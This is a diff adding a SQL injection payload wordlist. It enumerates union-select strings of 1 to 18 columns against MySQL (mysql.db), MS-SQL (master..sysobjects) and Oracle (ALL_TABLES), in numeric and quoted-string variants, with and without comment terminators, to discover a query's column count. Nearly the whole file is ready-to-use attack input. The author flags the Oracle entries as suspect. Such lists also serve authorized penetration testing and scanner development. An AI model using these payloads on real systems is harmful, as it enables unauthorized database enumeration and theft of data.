@@ -1,0 +1,262 @@
+##
+## This is usefull if need to do a Union select
+## and you dont know what the number of columns are..and is lazy like me..
+## Of course, finding out the types is a different story..:)
+## Feel free to seperate this into many files
+## It works for various DBs - Oracle,MS and MySQL
+##
+##
+## MySQL numerical, commented
+##
+1 union select 1 from mysql.db#
+1 union select 1,2 from mysql.db#
+1 union select 1,2,3 from mysql.db#
+1 union select 1,2,3,4 from mysql.db#
+1 union select 1,2,3,4,5 from mysql.db#
+1 union select 1,2,3,4,5,6 from mysql.db#
+1 union select 1,2,3,4,5,6,7 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9,10 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9,10,11 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from mysql.db#
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from mysql.db#
+##
+## MySQL alpha, commented
+##
+test' union select Db from mysql.db#
+test' union select Db,Db from mysql.db#
+test' union select Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db#
+##
+## MySQl, numeric uncommented
+##
+1 union select 1 from mysql.db
+1 union select 1,2 from mysql.db
+1 union select 1,2,3 from mysql.db
+1 union select 1,2,3,4 from mysql.db
+1 union select 1,2,3,4,5 from mysql.db
+1 union select 1,2,3,4,5,6 from mysql.db
+1 union select 1,2,3,4,5,6,7 from mysql.db
+1 union select 1,2,3,4,5,6,7,8 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9,10 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9,10,11 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from mysql.db
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from mysql.db
+##
+## MySQL, alpha - uncommented
+##
+test' union select Db from mysql.db
+test' union select Db,Db from mysql.db
+test' union select Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+test' union select Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db,Db from mysql.db
+##
+## MS-SQL, numerical, commented
+##
+1 union select 1 from master..sysobjects--
+1 union select 1,2 from master..sysobjects--
+1 union select 1,2,3 from master..sysobjects--
+1 union select 1,2,3,4 from master..sysobjects--
+1 union select 1,2,3,4,5 from master..sysobjects--
+1 union select 1,2,3,4,5,6 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9,10 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9,10,11 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from master..sysobjects--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from master..sysobjects--
+##
+## MS-SQL, numerical, uncommented
+##
+1 union select 1 from master..sysobjects
+1 union select 1,2 from master..sysobjects
+1 union select 1,2,3 from master..sysobjects
+1 union select 1,2,3,4 from master..sysobjects
+1 union select 1,2,3,4,5 from master..sysobjects
+1 union select 1,2,3,4,5,6 from master..sysobjects
+1 union select 1,2,3,4,5,6,7 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9,10 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9,10,11 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from master..sysobjects
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from master..sysobjects
+##
+## MS-SQL, alpha, commented
+##
+test' union select name from master..sysobjects--
+test' union select name,name from master..sysobjects--
+test' union select name,name,name from master..sysobjects--
+test' union select name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects--
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects--
+##
+## MS-SQL, alpha, uncommented
+##
+test' union select name from master..sysobjects
+test' union select name,name from master..sysobjects
+test' union select name,name,name from master..sysobjects
+test' union select name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects
+test' union select name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name,name from master..sysobjects
+##
+##NB:Oracle stuff is suspect..anyone?
+##
+## Oracle, numeric, commented
+##
+1 union select 1 from ALL_TABLES--
+1 union select 1,2 from ALL_TABLES--
+1 union select 1,2,3 from ALL_TABLES--
+1 union select 1,2,3,4 from ALL_TABLES--
+1 union select 1,2,3,4,5 from ALL_TABLES--
+1 union select 1,2,3,4,5,6 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9,10 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9,10,11 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from ALL_TABLES--
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from ALL_TABLES--
+##
+## Oracle, numeric, uncommented
+##
+1 union select 1 from ALL_TABLES
+1 union select 1,2 from ALL_TABLES
+1 union select 1,2,3 from ALL_TABLES
+1 union select 1,2,3,4 from ALL_TABLES
+1 union select 1,2,3,4,5 from ALL_TABLES
+1 union select 1,2,3,4,5,6 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9,10 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9,10,11 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from ALL_TABLES
+1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from ALL_TABLES
+##
+## Oracle, alpha, commented
+##
+test' union select 1 from ALL_TABLES--
+test' union select 1,2 from ALL_TABLES--
+test' union select 1,2,3 from ALL_TABLES--
+test' union select 1,2,3,4 from ALL_TABLES--
+test' union select 1,2,3,4,5 from ALL_TABLES--
+test' union select 1,2,3,4,5,6 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9,10 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9,10,11 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from ALL_TABLES--
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from ALL_TABLES--
+##
+## Oracle, alpa, uncommented
+##
+test' union select 1 from ALL_TABLES
+test' union select 1,2 from ALL_TABLES
+test' union select 1,2,3 from ALL_TABLES
+test' union select 1,2,3,4 from ALL_TABLES
+test' union select 1,2,3,4,5 from ALL_TABLES
+test' union select 1,2,3,4,5,6 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9,10 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9,10,11 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from ALL_TABLES
+test' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from ALL_TABLES
+
